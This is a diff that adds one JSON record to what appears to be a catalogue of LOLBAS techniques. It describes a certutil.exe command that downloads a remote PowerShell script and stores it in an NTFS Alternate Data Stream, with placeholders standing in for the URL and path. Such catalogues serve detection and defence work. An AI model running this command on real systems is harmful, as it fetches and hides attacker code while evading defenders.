@@ -1,0 +1,23 @@
+{
+  "id": "lolbas-certutil-exe-ads",
+  "name": "LOLBAS · Certutil.exe (ADS)",
+  "command": "certutil.exe -urlcache -f {REMOTEURL:.ps1} {PATH_ABSOLUTE}:ttt",
+  "description": "Download and save a .ps1 file to an Alternate Data Stream (ADS).",
+  "platform": "windows",
+  "tags": [
+    "lolbas",
+    "certutil",
+    "ads"
+  ],
+  "source": "lolbas",
+  "source_url": "https://lolbas-project.github.io/lolbas/Certutil/",
+  "upstream_id": "Certutil.exe/ADS/0",
+  "category": "lolbas",
+  "subcategory": "ads",
+  "references": [
+    {
+      "title": "LOLBAS — Certutil.exe",
+      "url": "https://lolbas-project.github.io/lolbas/Certutil/"
+    }
+  ]
+}
